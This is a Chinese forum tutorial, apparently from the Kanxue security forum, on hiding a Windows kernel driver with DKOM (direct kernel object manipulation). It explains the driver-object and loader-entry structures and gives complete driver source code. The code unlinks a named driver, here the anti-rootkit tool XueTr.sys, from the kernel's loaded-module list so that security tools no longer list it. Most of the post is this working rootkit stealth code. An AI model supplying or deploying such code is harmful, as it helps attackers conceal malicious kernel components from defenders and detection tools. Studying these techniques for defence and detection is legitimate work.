
# DKOM 隐藏驱动

> 原文：[`www.pediy.com/kssd/pediy12/135439.html`](https://www.pediy.com/kssd/pediy12/135439.html)

最近在学习 Rootkit，看雪 Rootkit 专题中没有驱动隐藏的例子 `http://bbs.pediy.com/showthread.php?t=56817`。

于是乎，我自己来实现了一把，特此献给看雪。

当服务控制管理器(SCM)加载一个驱动的时候，就会生成一个 `DRIVER_OBJECT` 结构的对象。

`nt!_DRIVER_OBJECT`

```
  +0x000 Type             : Int2B
  +0x002 Size             : Int2B
  +0x004 DeviceObject     : Ptr32_DEVICE_OBJECT
  +0x008 Flags            : Uint4B
  +0x00c DriverStart      : Ptr32 Void
  +0x010 DriverSize       : Uint4B
  +0x014 DriverSection    : Ptr32 Void
  +0x018 DriverExtension  : Ptr32_DRIVER_EXTENSION
  +0x01c DriverName       : _UNICODE_STRING
  +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING
  +0x028 FastIoDispatch   : Ptr32_FAST_IO_DISPATCH
  +0x02c DriverInit       : Ptr32     long
  +0x030 DriverStartIo    : Ptr32     void
  +0x034 DriverUnload     : Ptr32     void
  +0x038 MajorFunction    : [28]Ptr32     long
```

其中的 `DriverSection` 中保存着一个指向 `KLDR_DATA_TABLE_ENTRY` 结构体的指针。

这个结构体被用来保存驱动模块的一些信息。

在 WRK 中的定义如下：

```c
typedef struct _KLDR_DATA_TABLE_ENTRY {
   LIST_ENTRY InLoadOrderLinks;
   PVOID ExceptionTable;
   ULONG ExceptionTableSize;
   PVOID GpValue;
   DWORD UnKnow;
   PVOID DllBase;
   PVOID EntryPoint;
   ULONG SizeOfImage;
   UNICODE_STRING FullDllName;
   UNICODE_STRING BaseDllName;
   ULONG Flags;
   USHORT LoadCount;
   USHORT __Unused5;
   PVOID SectionPointer;
   ULONG CheckSum;
   PVOID LoadedImports;
   PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;
```

这个结构体中的第一个成员 `InLoadOrderLinks` 是一个 `LIST_ENTRY` 的结构。这使得每个驱动模块被串在了一个双向链表中。我们只要遍历这条双向链就能枚举出所有的驱动模块。

其中域 `DllBase` 是驱动模块的加载基地址。

`FullDllName` 是驱动模块的完整路径。

`BaseDllName` 是驱动模块的名称。

遍历结果如下：

![](img/b4568d1577e520f8a4df33a61e2f2b9a.jpg)

因此，如果我们要隐藏某个驱动，只需将我们要隐藏的驱动名跟链表中的每个节点的驱动名比较。一旦找到我们要隐藏的驱动，则修改它的 `InLoadOrderLinks` 域的 `Flink` 和 `Blink` 的指针即可。

图一: 修改前 `Flink` 和 `Blink` 指针的指向情况

![](img/9a23229c3f3b12090932e032d80d5a70.jpg)

图二: 修改后 `Flink` 和 `Blink` 指针的指向情况

![](img/01985e42c798fb440b772edafb8a0733.jpg)

```c
/*
 * 【作者：莫灰灰(LSG)】
 * 【空间：http://hi.baidu.com/hu3167343】
 */
#include <ntddk.h>

typedef unsigned long DWORD;

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    PVOID GpValue;
    DWORD UnKnow;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT __Unused5;
    PVOID SectionPointer;
    ULONG CheckSum;
    PVOID LoadedImports;
    PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

PDRIVER_OBJECT pDriverObject = NULL;

VOID
HideDriver()
{
    PKLDR_DATA_TABLE_ENTRY entry =(PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
    PKLDR_DATA_TABLE_ENTRY firstentry;
    UNICODE_STRING uniDriverName;
    firstentry = entry;
    // 初始化要隐藏驱动的驱动名
    RtlInitUnicodeString(&uniDriverName, L"XueTr.sys");
    while((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != firstentry)
    {
        if (entry->FullDllName.Buffer != 0)
        {
            if (RtlCompareUnicodeString(&uniDriverName, &(entry->BaseDllName), FALSE) == 0)
            {
                KdPrint(("隐藏驱动 %ws 成功!\n", entry->BaseDllName.Buffer));
                // 修改 Flink 和 Blink 指针, 以跳过我们要隐藏的驱动
                *((DWORD*)entry->InLoadOrderLinks.Blink) = (DWORD)entry->InLoadOrderLinks.Flink;
                entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
                /*
                    使被隐藏驱动 LIST_ENTRY 结构体的 Flink, Blink 域指向自己
                    因为此节点本来在链表中, 那么它邻接的节点驱动被卸载时,
                    系统会把此节点的 Flink, Blink 域指向它相邻节点的下一个节点.
                    但是, 它此时已经脱离链表了, 如果现在它原本相邻的节点驱动被
                    卸载了, 那么此节点的 Flink, Blink 域将有可能指向无用的地址, 而
                    造成随机性的 BSoD.
                */
                entry->InLoadOrderLinks.Flink = (LIST_ENTRY*)&(entry->InLoadOrderLinks.Flink);
                entry->InLoadOrderLinks.Blink = (LIST_ENTRY*)&(entry->InLoadOrderLinks.Flink);
                break;
            }
        }
        // 链表往前走
        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
    }
}

NTSTATUS
UnloadDriver(
             IN PDRIVER_OBJECT DriverObject
             )
{
    return STATUS_SUCCESS;
}

NTSTATUS
DriverEntry(
            IN PDRIVER_OBJECT DriverObject,
            IN PUNICODE_STRING  RegistryPath
            )
{
    DriverObject->DriverUnload = UnloadDriver;
    pDriverObject = DriverObject;
    HideDriver();
    return STATUS_SUCCESS;
}
```

摘了 `XueTr` 的驱动之后，我们用 `ARK` 工具来看一下(`XueTr` 和 `PT` 都是最新版)。

![](img/a07c6eee4bb1aa8361511396ce87e9e1.jpg)
